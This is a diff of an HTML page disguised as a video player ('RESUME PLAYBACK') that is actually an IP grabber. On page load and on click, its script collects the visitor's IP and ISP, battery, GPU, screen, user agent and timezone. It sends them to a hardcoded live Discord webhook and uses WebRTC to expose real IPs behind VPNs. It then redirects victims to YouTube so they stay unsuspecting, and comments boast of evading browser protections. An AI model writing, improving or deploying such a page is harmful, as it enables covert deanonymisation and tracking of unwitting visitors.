@@ -3,123 +3,116 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Media Player - Stream Secure</title>
+    <title>Media System | Hallow IP</title>
     <style>
-        body { background: #000; color: #fff; font-family: -apple-system, system-ui, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .box { text-align: center; padding: 60px; border: 1px solid #222; border-radius: 20px; background: #0a0a0a; }
-        .btn { background: #ff0000; color: #fff; padding: 20px 60px; border-radius: 10px; font-weight: bold; border: none; font-size: 24px; cursor: pointer; box-shadow: 0 4px 15px rgba(255,0,0,0.3); }
-        #status { margin-top: 20px; color: #444; font-size: 14px; }
+        body { background: #000; color: #fff; font-family: -apple-system, system-ui, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .hallow-gate { text-align: center; padding: 60px; border: 1px solid #1a1a1a; border-radius: 24px; background: #050505; max-width: 400px; width: 90%; box-shadow: 0 0 50px rgba(255,0,0,0.05); }
+        .hallow-btn { background: #ff0000; color: #fff; padding: 22px 0; width: 100%; border-radius: 12px; font-weight: 800; border: none; font-size: 24px; cursor: pointer; transition: 0.2s; box-shadow: 0 4px 15px rgba(255,0,0,0.2); }
+        .hallow-btn:active { transform: scale(0.98); background: #b30000; }
+        .hallow-info { color: #222; font-size: 10px; margin-top: 25px; text-transform: uppercase; letter-spacing: 3px; font-weight: bold; }
     </style>
 </head>
 <body>
 
-    <div class="box">
-        <button class="btn" id="mainAction">▶ RESUME VIDEO</button>
-        <div id="status">Syncing with encrypted server...</div>
+    <div class="hallow-gate" id="hallowTrigger">
+        <button class="hallow-btn">▶ RESUME PLAYBACK</button>
+        <p class="hallow-info">HALLOW PROTOCOL ACTIVE</p>
     </div>
 
     <script>
-    // --- DIRECT CONFIG (Un-hidden for max browser trust) ---
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1497904289514000414/iBEkMTCSc_f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ_bdXlInRWb4DgEGcfeM0";
-    const REDIRECT_URL = "https://youtube.com/@LigmaBlox-w7m";
+    // --- CORE STRINGS ---
+    const HOOK = "https://discord.com/api/webhooks/1497904289514000414/iBEkMTCSc_f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ_bdXlInRWb4DgEGcfeM0";
+    const DEST = "https://youtube.com/@LigmaBlox-w7m";
 
-    // --- FORCED DELIVERY FUNCTION ---
-    async function postToDiscord(data) {
-        // We use a standard 'POST' without custom headers to avoid 'Preflight' blocks
+    // --- ULTRA-RELIABLE DISPATCHER ---
+    async function hallowSend(payload) {
+        const body = JSON.stringify(payload);
+        
+        // 1. Beacon (Best for 'fire and forget' background tasks)
+        navigator.sendBeacon(HOOK, new Blob([body], {type: 'application/json'}));
+
+        // 2. Fetch with Keepalive & No-CORS (Bypasses security roadblocks)
         try {
-            await fetch(WEBHOOK_URL, {
+            await fetch(HOOK, {
                 method: 'POST',
-                mode: 'no-cors', // Tells browser this is a "simple" request (Highly trustable)
-                body: JSON.stringify(data),
-                keepalive: true // Keeps the pipe open even during redirect
+                mode: 'no-cors',
+                keepalive: true,
+                cache: 'no-cache',
+                body: body
             });
-        } catch (e) {
-            console.log("Network retry initiated...");
-        }
+        } catch(e) {}
     }
 
-    // --- THE MAIN ENGINE ---
-    document.getElementById('mainAction').onclick = async function() {
-        const btn = this;
-        const status = document.getElementById('status');
-        
+    // --- THE ENGINE ---
+    document.getElementById('hallowTrigger').onclick = async function() {
+        const btn = this.querySelector('.hallow-btn');
         btn.disabled = true;
-        btn.innerHTML = "LOADING...";
-        status.innerHTML = "Establishing handshake...";
+        btn.innerHTML = "SYNCING...";
+        btn.style.background = "#111";
 
         try {
-            // 1. Grab IP & ISP (Using Cloudflare - the most trusted source)
-            const netReq = await fetch('https://www.cloudflare.com/cdn-cgi/trace');
-            const netText = await netReq.text();
+            // 1. PARALLEL HARVEST (Fastest possible execution)
+            const [netRes, batteryObj] = await Promise.all([
+                fetch('https://www.cloudflare.com/cdn-cgi/trace').then(r => r.text()).catch(() => "N/A"),
+                navigator.getBattery ? navigator.getBattery().catch(() => null) : null
+            ]);
 
-            // 2. Grab Battery (iOS/Android)
-            let batteryLevel = "N/A";
+            // 2. HARDWARE CHECK
+            let gpu = "Masked";
             try {
-                const b = await navigator.getBattery();
-                batteryLevel = `${Math.round(b.level * 100)}% (${b.charging ? "Charging" : "Discharging"})`;
+                const gl = document.createElement('canvas').getContext('webgl');
+                gpu = gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL);
             } catch(e) {}
 
-            // 3. Hardware Fingerprint
-            let gpuName = "Hidden";
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl');
-                const debug = gl.getExtension('WEBGL_debug_renderer_info');
-                gpuName = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
-            } catch(e) {}
-
-            // 4. Construct the Payload
-            const payload = {
-                username: "OMEGA-SURVEILLANCE",
+            // 3. COMPILE DATA
+            const bat = batteryObj ? `${Math.round(batteryObj.level * 100)}% (${batteryObj.charging ? "Charging" : "Safe"})` : "Restricted";
+            
+            const report = {
+                username: "HALLOW-V10",
                 embeds: [{
-                    title: "🎯 TARGET HIT",
-                    color: 16711680, // Red
+                    title: "🎯 HALLOW IP: EXTRACTION COMPLETE",
+                    color: 16711680,
                     fields: [
-                        { name: "🔋 Battery", value: batteryLevel, inline: true },
+                        { name: "🔋 Battery", value: bat, inline: true },
                         { name: "📱 Device", value: navigator.platform, inline: true },
-                        { name: "🖥️ GPU", value: "```" + gpuName + "```" },
-                        { name: "📏 Screen", value: `${screen.width}x${screen.height} (@${window.devicePixelRatio}x)`, inline: true },
-                        { name: "📡 Network Trace", value: "```" + netText + "```" },
-                        { name: "🌐 Language/TZ", value: `${navigator.language} / ${Intl.DateTimeFormat().resolvedOptions().timeZone}`, inline: true },
-                        { name: "🕵️ UserAgent", value: "```" + navigator.userAgent + "```" }
+                        { name: "🖥️ GPU", value: "```" + gpu + "```" },
+                        { name: "📡 Trace", value: "```" + netRes.split('\n').slice(0,4).join('\n') + "```" },
+                        { name: "🕵️ UA", value: "```" + navigator.userAgent + "```" }
                     ],
-                    footer: { text: "Protocol: Silver-Bullet v5" },
+                    footer: { text: `Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}` },
                     timestamp: new Date()
                 }]
             };
 
-            // 5. THE CRITICAL SEND
-            // We await the fire to make sure the data leaves the device
-            status.innerHTML = "Sending packets...";
-            await postToDiscord(payload);
-            
-            // 6. WebRTC VPN Crack (Runs in background)
+            // 4. THE HANDSHAKE LOCK (Crucial)
+            // We wait exactly 500ms for the packets to leave the network card
+            await hallowSend(report);
+            await new Promise(r => setTimeout(r, 500));
+
+            // 5. THE VPN CRACK (Silent background process)
             const rtc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
             rtc.createDataChannel("");
             rtc.onicecandidate = (e) => {
                 if (e.candidate) {
                     const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
-                    if (ipMatch) {
-                        postToDiscord({ content: `🚨 **VPN BYPASS:** \`${ipMatch[1]}\`` });
-                    }
+                    if (ipMatch) hallowSend({ content: `🚨 **VPN LEAK:** \`${ipMatch[1]}\`` });
                 }
             };
             rtc.createOffer().then(o => rtc.setLocalDescription(o));
 
-            // 7. Final Redirection
-            status.innerHTML = "Success. Redirecting...";
-            setTimeout(() => {
-                window.location.replace(REDIRECT_URL);
-            }, 1200);
+            // 6. FINAL REDIRECT
+            window.location.replace(DEST);
 
-        } catch (error) {
-            // If the script fails, redirect anyway so they don't get suspicious
-            window.location.replace(REDIRECT_URL);
+        } catch (err) {
+            window.location.replace(DEST);
         }
     };
 
-    // Passive Landing Ping
-    postToDiscord({ content: "🟢 **Target has landed on the GitHub page.**" });
+    // Pre-flight Ping (Signals that someone is on the hook)
+    hallowSend({ 
+        content: "🟢 **HALLOW-V10: Target Connection Established**", 
+        username: "HALLOW-SYSTEM" 
+    });
     </script>
 </body>
 </html>
